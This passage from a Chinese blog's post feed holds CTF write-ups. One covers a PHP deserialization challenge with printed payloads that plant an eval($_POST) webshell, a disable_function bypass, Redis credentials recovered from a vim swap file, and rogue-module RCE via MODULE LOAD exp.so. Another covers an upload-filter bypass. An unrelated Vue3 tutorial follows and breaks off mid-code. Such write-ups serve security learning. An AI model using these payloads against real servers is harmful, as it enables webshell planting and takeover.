class="keyword">public</span> <span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=&amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="string">&quot;system(&#x27;cat /fffffffffflagafag&#x27;);&quot;</span>;</span><br><span class="line">        <span class="comment">// $this-&gt;b=&quot;system(&#x27;cat /fffffffffflagafag&#x27;);&quot;;</span></span><br><span class="line">        <span class="comment">// $this-&gt;c=&#x27;123&#x27;;</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"> <span class="comment">//O:4:&quot;test&quot;:4:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;s:33:&quot;system(&#x27;cat /fffffffffflagafag&#x27;);&quot;;&#125;</span></span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>redisRCE&amp;&amp;disable_function绕过</title>
      <link href="/posts/6d4a3223.html"/>
      <url>/posts/6d4a3223.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.nssctf.cn/problem/364">天翼杯 2021esay_eval | NSSCTF</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开题源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>],<span class="variable">$ret</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$ret</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$ret</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$i</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$i</span>)!==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;you want to bypass wakeup ? no !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>so easy</code> 的一个反序列化,要注意一个点,利用<code>php对类名大小写不敏感</code>的特性去绕过题目中的正则表达式，在构造payload的时候，将类名换为<code>a</code>,<code>b</code>；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//$this-&gt;code=&quot;phpinfo();&quot;;</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;code=<span class="string">&quot;eval(\$_GET[&#x27;pass&#x27;]);&quot;</span>;<span class="comment">//写个🐎进去</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">b</span>());</span><br><span class="line"><span class="comment"># 最后改一下b类属性的数量,让其不为1,触发wakeup魔术方法</span></span><br><span class="line"><span class="comment">//O:1:&quot;b&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">21</span>:<span class="string">&quot;eval(<span class="subst">$_POST</span>[&#x27;pass&#x27;]);&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后就是一键连接了.得到如下东西</p><p><img src="https://gitee.com/eviden/img/raw/master/image-20240612201646430.png" alt="image-20240612201646430"></p><p><img src="https://gitee.com/eviden/img/raw/master/image-20240612201703826.png" alt="image-20240612201703826"></p><p>刚准备查看上一级目录,提示权限不够呗</p><p>法一:直接暴力绕过disable_function,Antsword要利用插件,哥斯拉好像自带这个插件</p><p><img src="https://gitee.com/eviden/img/raw/master/image-20240612202925716.png" alt="image-20240612202925716"></p><p>直接一把梭</p><p><img src="https://gitee.com/eviden/img/raw/master/image-20240612203043549.png" alt="image-20240612203043549"></p><p>2.不用外挂,自己慢慢搞,然后看一下之前那个目录的文件,发现swp备份文件里面写着redis数据库的账号密码.拿去复原一下</p><p>这里是<code>vim缓存泄露</code>：</p><blockquote><p>在开发人员使用 vim 编辑器 编辑文本时，系统会自动生成一个备份文件，当编辑完成后，保存时，原文件会更新，备份文件会被自动删除。</p><p>但是，当编辑操作意外终止时，这个备份文件就会保留，如果多次编辑文件都意外退出，备份文件并不会覆盖，而是以 swp、swo、swn 等其他格式，依次备份。</p></blockquote><p>利用命令<code>vim -r xxxx.php.swp</code>恢复原配置文件</p><p><img src="https://gitee.com/eviden/img/raw/master/image-20240612203444240.png" alt="image-20240612203444240"></p><p>得到如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_HOST&quot;</span>,<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_USERNAME&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_PASSWOrd&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_DATABASE&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;REDIS_PASS&quot;</span>,<span class="string">&quot;you_cannot_guess_it&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里要下载<code>exp.so</code>文件，并进行利用，简单解释一下<code>exp.so</code>文件</p><blockquote><p>Redis 中的 <code>exp.so</code> 文件通常被用作 Redis 提权的一种方式。这个文件是一个 Redis 模块，它可以在 Redis 服务器中执行任意代码。</p><p>Redis 模块是一种可插拔的扩展，它允许用户在 Redis 服务器中添加新的功能。<code>exp.so</code> 文件是一个 Redis 模块，它提供了一些命令和功能，可以让攻击者在 Redis 服务器中执行任意代码，从而获得服务器的控制权。</p><p>在 Redis 提权攻击中，攻击者通常会利用 Redis 的漏洞或者弱密码，获取 Redis 服务器的访问权限。一旦攻击者获得了访问权限，他们就可以上传 <code>exp.so</code> 文件到 Redis 服务器中，并使用 Redis 的 <code>module load</code> 命令加载这个文件。这个文件会在 Redis 服务器中执行任意代码，从而让攻击者获得服务器的控制权。</p></blockquote><p>exp.so文件地址下载：<a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p><p>上传exp.so进行redis提权</p><p>然后利用蚁剑redis插件进行提权</p><p><img src="https://gitee.com/eviden/img/raw/master/image-20240612204150887.png" alt="image-20240612204150887"></p><p>前面介绍过，我们要利用<code>module load</code> 命令加载这个文件，然后才能进行RCE，所以在虚拟命令行输入<code>MODULE LOAD /var/www/html/exp.so</code></p><p>然后我们就可以进行命令执行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system.exec <span class="string">&quot;ls /&quot;</span></span><br><span class="line">system.exec <span class="string">&quot;cat /flagaasdbjanssctf&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/image-20240612204403106.png" alt="image-20240612204403106"></p><blockquote><p><a href="https://buuoj.cn/challenges#%5BGXYCTF2019%5DBabySQli">BUUCTF在线评测 (buuoj.cn)</a></p></blockquote><p>这个题文件考的是上传漏洞,但是你深挖一下发现它里面还有些东西的,连上后门无法执行命令.</p><p>题目后端源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; </span></span><br><span class="line"><span class="string">&lt;title&gt;Upload&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;form action=\&quot;\&quot; method=\&quot;post\&quot; enctype=\&quot;multipart/form-data\&quot;&gt;</span></span><br><span class="line"><span class="string">上传文件&lt;input type=\&quot;file\&quot; name=\&quot;uploaded\&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=\&quot;submit\&quot; name=\&quot;submit\&quot; value=\&quot;上传\&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">time</span>() . (<span class="keyword">string</span>)<span class="title function_ invoke__">rand</span>(<span class="number">100</span>, <span class="number">1000</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$target_path</span>  = <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;/upload/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$t_path</span> = <span class="variable">$target_path</span> . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">substr</span>(<span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$uploaded_name</span>,<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$uploaded_ext</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;后缀名不能有ph！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (((<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;</span></span><br><span class="line"><span class="string">            &quot;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)) &amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048</span>))&#123;</span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploaded_tmp</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?/i&quot;</span>, <span class="variable">$content</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;诶，别蒙我啊，这标志明显还是php啊&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;GBK&quot;</span>, <span class="variable">$target_path</span>), <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">                <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$uploaded_tmp</span>, <span class="variable">$t_path</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$t_path&#125;</span> succesfully uploaded!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;上传类型也太露骨了吧！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传<code>.htaccess</code>以及jpg文件绕过所有的waf.</p><p>然后利用哥斯拉bypass disable_function</p><p><img src="https://gitee.com/eviden/img/raw/master/image-20240613000011010.png" alt="image-20240613000011010"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue3快速上手</title>
      <link href="/posts/7374ccd5.html"/>
      <url>/posts/7374ccd5.html</url>
      
        <content type="html"><![CDATA[<h1>1. Vue3简介</h1><ul><li><p>2020年9月18日，<code>Vue.js</code>发布版<code>3.0</code>版本，代号：<code>One Piece</code>（n</p></li><li><p>经历了：<a href="https://github.com/vuejs/core/commits/main">4800+次提交</a>、<a href="https://github.com/vuejs/rfcs/tree/master/active-rfcs">40+个RFC</a>、<a href="https://github.com/vuejs/vue-next/pulls?q=is%3Apr+is%3Amerged+-author%3Aapp%2Fdependabot-preview+">600+次PR</a>、<a href="https://github.com/vuejs/core/graphs/contributors">300+贡献者</a></p></li><li><p>官方发版地址：<a href="https://github.com/vuejs/core/releases/tag/v3.0.0">Release v3.0.0 One Piece · vuejs/core</a></p></li><li><p>截止2023年10月，最新的公开版本为：<code>3.3.4</code></p><img src="images/1695089947298-161c1b47-eb86-42fb-b1f8-d6a4fcab8ee2.png" alt="image.png" style="zoom:30%;" /> </li></ul><h2 id="1-1-【性能的提升】">1.1. 【性能的提升】</h2><ul><li><p>打包大小减少<code>41%</code>。</p></li><li><p>初次渲染快<code>55%</code>, 更新渲染快<code>133%</code>。</p></li><li><p>内存减少<code>54%</code>。</p></li></ul><h2 id="1-2-【-源码的升级】">1.2.【 源码的升级】</h2><ul><li><p>使用<code>Proxy</code>代替<code>defineProperty</code>实现响应式。</p></li><li><p>重写虚拟<code>DOM</code>的实现和<code>Tree-Shaking</code>。</p></li></ul><h2 id="1-3-【拥抱TypeScript】">1.3. 【拥抱TypeScript】</h2><ul><li><code>Vue3</code>可以更好的支持<code>TypeScript</code>。</li></ul><h2 id="1-4-【新的特性】">1.4. 【新的特性】</h2><ol><li><p><code>Composition API</code>（组合<code>API</code>）：</p><ul><li><p><code>setup</code></p></li><li><p><code>ref</code>与<code>reactive</code></p></li><li><p><code>computed</code>与<code>watch</code></p><p>…</p></li></ul></li><li><p>新的内置组件：</p><ul><li><p><code>Fragment</code></p></li><li><p><code>Teleport</code></p></li><li><p><code>Suspense</code></p><p>…</p></li></ul></li><li><p>其他改变：</p><ul><li><p>新的生命周期钩子</p></li><li><p><code>data</code> 选项应始终被声明为一个函数</p></li><li><p>移除<code>keyCode</code>支持作为<code> v-on</code> 的修饰符</p><p>…</p></li></ul></li></ol><h1>2. 创建Vue3工程</h1><h2 id="2-1-【基于-vue-cli-创建】">2.1. 【基于 vue-cli 创建】</h2><p>点击查看<a href="https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create">官方文档</a></p><blockquote><p>备注：目前<code>vue-cli</code>已处于维护模式，官方推荐基于 <code>Vite</code> 创建项目。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 查看@vue/cli版本，确保@vue/cli版本在4.5.0以上</span></span><br><span class="line">vue <span class="literal">--version</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 安装或者升级你的@vue/cli </span></span><br><span class="line">npm install <span class="literal">-g</span> @vue/<span class="built_in">cli</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 执行创建命令</span></span><br><span class="line">vue create vue_test</span><br><span class="line"></span><br><span class="line"><span class="comment">##  随后选择3.x</span></span><br><span class="line"><span class="comment">##  Choose a version of Vue.js that you want to start the project with (Use arrow keys)</span></span><br><span class="line"><span class="comment">##  &gt; 3.x</span></span><br><span class="line"><span class="comment">##    2.x</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 启动</span></span><br><span class="line"><span class="built_in">cd</span> vue_test</span><br><span class="line">npm run serve</span><br></pre></td></tr></table></figure><hr><h2 id="2-2-【基于-vite-创建】-推荐">2.2. 【基于 vite 创建】(推荐)</h2><p><code>vite</code> 是新一代前端构建工具，官网地址：<a href="https://vitejs.cn/">https://vitejs.cn</a>，<code>vite</code>的优势如下：</p><ul><li>轻量快速的热重载（<code>HMR</code>），能实现极速的服务启动。</li><li>对 <code>TypeScript</code>、<code>JSX</code>、<code>CSS</code> 等支持开箱即用。</li><li>真正的按需编译，不再等待整个应用编译完成。</li><li><code>webpack</code>构建 与 <code>vite</code>构建对比图如下：<br><img src="images/1683167182037-71c78210-8217-4e7d-9a83-e463035efbbe.png" alt="webpack构建" title="webpack构建" style="zoom:20%;box-shadow:0 0 10px black" /><img src="images/1683167204081-582dc237-72bc-499e-9589-2cdfd452e62f.png" alt="vite构建" title="vite构建" style="zoom: 20%;box-shadow:0 0 10px black" /></li></ul><ul><li>具体操作如下（点击查看<a href="https://cn.vuejs.org/guide/quick-start.html#creating-a-vue-application">官方文档</a>）</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 1.创建命令</span></span><br><span class="line">npm create vue@latest</span><br><span class="line"></span><br><span class="line"><span class="comment">## 2.具体配置</span></span><br><span class="line"><span class="comment">## 配置项目名称</span></span><br><span class="line">√ Project name: vue3_test</span><br><span class="line"><span class="comment">## 是否添加TypeScript支持</span></span><br><span class="line">√ Add TypeScript?  Yes</span><br><span class="line"><span class="comment">## 是否添加JSX支持</span></span><br><span class="line">√ Add JSX Support?  No</span><br><span class="line"><span class="comment">## 是否添加路由环境</span></span><br><span class="line">√ Add Vue Router <span class="keyword">for</span> Single Page Application development?  No</span><br><span class="line"><span class="comment">## 是否添加pinia环境</span></span><br><span class="line">√ Add Pinia <span class="keyword">for</span> state management?  No</span><br><span class="line"><span class="comment">## 是否添加单元测试</span></span><br><span class="line">√ Add Vitest <span class="keyword">for</span> Unit Testing?  No</span><br><span class="line"><span class="comment">## 是否添加端到端测试方案</span></span><br><span class="line">√ Add an <span class="keyword">End</span><span class="literal">-to-End</span> Testing Solution? » No</span><br><span class="line"><span class="comment">## 是否添加ESLint语法检查</span></span><br><span class="line">√ Add ESLint <span class="keyword">for</span> code quality?  Yes</span><br><span class="line"><span class="comment">## 是否添加Prettiert代码格式化</span></span><br><span class="line">√ Add Prettier <span class="keyword">for</span> code formatting?  No</span><br></pre></td></tr></table></figure><p>自己动手编写一个App组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;app&quot;&gt;</span><br><span class="line">    &lt;h1&gt;你好啊！&lt;/h1&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name:&#x27;App&#x27; //组件名</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">  .app &#123;</span><br><span class="line">    background-color: #ddd;</span><br><span class="line">    box-shadow: 0 0 10px;</span><br><span class="line">    border-radius: 10px;</span><br><span class="line">    padding: 20px;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>安装官方推荐的<code>vscode</code>插件：</p><img src="images/volar.png" alt="Snipaste_2023-10-08_20-46-34" style="zoom:50%;" /> <img src="images/image-20231218085906380.png" alt="image-20231218085906380" style="zoom:42%;" /> <p>总结：</p><ul><li><code>Vite</code> 项目中，<code>index.html</code> 是项目的入口文件，在项目最外层。</li><li>加载<code>index.html</code>后，<code>Vite</code> 解析 <code>&lt;script type=&quot;module&quot; src=&quot;xxx&quot;&gt;</code> 指向的<code>JavaScript</code>。</li><li><code>Vue3</code>**中是通过 **<code>createApp</code> 函数创建一个应用实例。</li></ul><h2 id="2-3-【一个简单的效果】">2.3. 【一个简单的效果】</h2><p><code>Vue3</code>向下兼容<code>Vue2</code>语法，且<code>Vue3</code>中的模板中可以没有根标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button 